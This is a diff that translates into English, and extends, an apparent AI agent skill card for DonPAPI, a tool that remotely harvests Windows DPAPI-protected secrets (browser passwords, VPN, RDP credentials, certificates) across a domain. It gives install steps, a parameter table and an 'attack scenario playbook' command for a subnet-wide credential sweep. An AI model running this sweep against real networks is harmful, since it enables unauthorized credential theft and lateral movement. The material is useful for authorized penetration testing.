@@ -2,38 +2,39 @@
 name: donpapi-dpapi-harvest
 description: "DonPAPI: domain-wide DPAPI credential sweep. Signals: AD attack, domain penetration, single-host triage, connectivity test, output directory."
 zh-signals: "DonPAPI: 域内 DPAPI 凭据大扫荡。信号:ad攻击,域渗透,单机 triage,连通性测试,输出目录。"
+when-to-use: "Use to remotely harvest DPAPI-protected secrets such as browser passwords, VPN, RDP, and certificates across a domain."
 ---
 
 # DonPAPI
 
-- 攻击大类:C30 AD与横向移动
-- 上游仓库:https://github.com/login-securite/DonPAPI
-- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C30 AD and Lateral Movement
+- Upstream Repository: https://github.com/login-securite/DonPAPI
+- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 pip install donpapi
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `donpapi collect -u svc -p pass -d corp.local -t 10.0.0.0/24` | 批量收割 DPAPI 机密 |
-| `donpapi triage -t 10.0.0.5` | 单机 triage |
-| `donpapi test -t 10.0.0.5` | 连通性测试 |
-| `-o out/` | 输出目录 |
+| `donpapi collect -u svc -p pass -d corp.local -t 10.0.0.0/24` | Bulk harvest of DPAPI secrets |
+| `donpapi triage -t 10.0.0.5` | Single-host triage |
+| `donpapi test -t 10.0.0.5` | Connectivity test |
+| `-o out/` | Output directory |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### 域内 DPAPI 凭据大扫荡
+### Domain-wide DPAPI credential sweep
 
 ```bash
 donpapi collect -u svc -p pass -d corp.local -t 10.0.0.0/24
-# 浏览器保存密码/Wi-Fi/VNC/证书全收割,常直接出域管凭据
+# Harvests saved browser passwords/Wi-Fi/VNC/certificates, often yielding domain controller credentials
 ```
 
-## 注意事项
+## Notes
 
-login-securite 出品,远程批量收割 Windows DPAPI 保护的秘密(浏览器密码、VPN、RDP 凭据等)。
+From login-securite; remotely harvests secrets protected by Windows DPAPI (browser passwords, VPN, RDP credentials, and more) in bulk.
